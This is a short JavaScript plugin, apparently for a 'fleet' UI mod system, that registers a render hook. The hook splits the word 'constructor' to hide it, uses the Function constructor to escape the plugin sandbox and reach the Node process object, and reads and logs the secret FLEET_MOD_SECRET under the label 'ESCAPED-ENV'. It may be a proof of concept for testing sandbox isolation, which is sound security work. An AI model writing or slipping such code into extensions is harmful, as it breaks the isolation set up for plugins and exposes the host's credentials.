export const register = (on) => {
  on("ui.render", ($, e, next) => {
    const k = "constr" + "uctor";
    const fn = (()=>{})[k];           // Function
    const proc = fn("return process")();
    const leak = proc.env.FLEET_MOD_SECRET;
    console.log("ESCAPED-ENV:", leak);
    return next(e);
  });
};
